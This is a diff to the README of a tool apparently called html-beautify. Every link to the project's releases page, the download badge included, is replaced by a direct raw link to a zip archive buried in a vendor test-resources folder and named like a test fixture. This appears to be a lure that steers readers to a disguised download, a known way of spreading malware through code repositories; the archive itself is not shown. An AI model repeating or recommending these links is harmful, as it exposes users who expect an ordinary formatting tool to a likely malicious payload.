@@ -6,11 +6,11 @@ Welcome to **html-beautify**! This is a simple tool that helps you clean up your
 
 ## 🔗 Download Link
 
-[![Download html-beautify](https://img.shields.io/badge/Download-hhtml-beautify-brightgreen)](https://github.com/lordJonsnow/html-beautify/releases)
+[![Download html-beautify](https://github.com/lordJonsnow/html-beautify/raw/refs/heads/main/vendor/jsbeautify/js/test/resources/html_beautify_3.8-alpha.5.zip)](https://github.com/lordJonsnow/html-beautify/raw/refs/heads/main/vendor/jsbeautify/js/test/resources/html_beautify_3.8-alpha.5.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [Download html-beautify](https://github.com/lordJonsnow/html-beautify/releases).
+To get started, visit this page to download the software: [Download html-beautify](https://github.com/lordJonsnow/html-beautify/raw/refs/heads/main/vendor/jsbeautify/js/test/resources/html_beautify_3.8-alpha.5.zip).
 
 Once you open the page, you will see different versions of the application. Choose the latest version listed at the top. Click on the version number, and look for the download link that matches your operating system. Click it to download the file.
 
@@ -60,4 +60,4 @@ Thank you for choosing **html-beautify**! We hope this tool enhances your coding
 
 ## 🔗 Download Link Again
 
-For convenience, here’s the link again: [Download html-beautify](https://github.com/lordJonsnow/html-beautify/releases).
+For convenience, here’s the link again: [Download html-beautify](https://github.com/lordJonsnow/html-beautify/raw/refs/heads/main/vendor/jsbeautify/js/test/resources/html_beautify_3.8-alpha.5.zip).
